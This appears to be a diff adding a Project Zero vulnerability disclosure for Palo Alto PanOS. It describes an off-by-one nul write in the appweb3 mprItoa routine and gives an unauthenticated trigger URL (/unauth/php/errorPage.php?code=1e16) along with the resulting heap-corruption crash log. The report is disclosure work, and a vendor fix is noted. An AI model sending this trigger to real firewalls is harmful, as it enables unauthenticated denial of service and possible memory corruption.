@@ -1,0 +1,53 @@
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=908
+Palo Alto Networks have published a fix for this issue: http://securityadvisories.paloaltonetworks.com/Home/Detail/68
+
+PanOS uses a modified version of the appweb3 embedded webserver, it's used for
+a variety of tasks and is enabled by default. I've noticed a bug in the core utility routine mprItoa:
+
+char *mprItoa(char *buf, int size, int64 value, int radix);
+
+https://embedthis.com/appweb/doc-3/ejs/api/mpr.html#mpr_8h_1c44ccf179c55dbbcf7aa04ba86090463
+
+The size parameter is documented to be the size of the buffer at *buf, but if
+the value exceeds that it will write one more byte than that as a nul
+terminator.
+
+Note that appweb3 has been EOL since 2012 and no longer receives security
+updates and is not supported by the developer, so security maintenance is the
+responsibility of Palo Alto Networks. It seems crazy to ship a EOL web server,
+but whatever.
+
+I've found an unauthenticated php script that an attacker call force to invoke
+mprItoa() on a default installation at /unauth/php/errorPage.php, it can be
+called like so:
+
+/unauth/php/errorPage.php?code=1e16
+
+This example should corrupt the stored GOT pointer, resulting in some
+unexpected routine being called on the attacker-controlled MaResponse object,
+and crashing with some heap corruption.
+
+*** glibc detected *** /usr/local/bin/appweb3: double free or corruption (out): 0x08229e98 ***
+======= Backtrace: =========
+/lib/libc.so.6[0xf7ee8786]
+/lib/libc.so.6(cfree+0x59)[0xf7ee8bb9]
+/usr/local/bin/../lib/3p/libappweb3.so.1(maFillHeaders+0x128)[0xf7e64c58]
+/usr/local/bin/../lib/3p/libappweb3.so.1[0xf7e6793b]
+/usr/local/bin/../lib/3p/libappweb3.so.1(maServiceQueue+0x28)[0xf7e608f8]
+/usr/local/bin/../lib/3p/libappweb3.so.1(maServiceQueues+0x38)[0xf7e5f438]
+/usr/local/bin/../lib/3p/libappweb3.so.1(maRunPipeline+0x37)[0xf7e5f497]
+/usr/local/bin/../lib/3p/libappweb3.so.1[0xf7e6346d]
+/usr/local/bin/../lib/3p/libappweb3.so.1(maProcessReadEvent+0x27f)[0xf7e63e0f]
+/usr/local/bin/../lib/3p/libappweb3.so.1[0xf7e5ad74]
+/usr/local/bin/../lib/3p/libappweb3.so.1[0xf7e36afd]
+/usr/local/bin/../lib/3p/libappweb3.so.1[0xf7e3607c]
+/usr/local/bin/../lib/3p/libappweb3.so.1[0xf7e30c6f]
+/usr/local/bin/../lib/3p/libappweb3.so.1(threadProcWrapper+0x36)[0xf7e31296]
+/lib/libpthread.so.0[0xf6e9b6e1]
+/lib/libc.so.6(clone+0x5e)[0xf7f52aee]
+======= Memory map: ========
+08048000-0804c000 rwxp 00000000 08:02 67709                              /usr/local/bin/appweb3
+0804c000-095e5000 rwxp 00000000 00:00 0                                  [heap]
+f1c00000-f1cd0000 rwxp 00000000 00:00 0 
+
+etc.
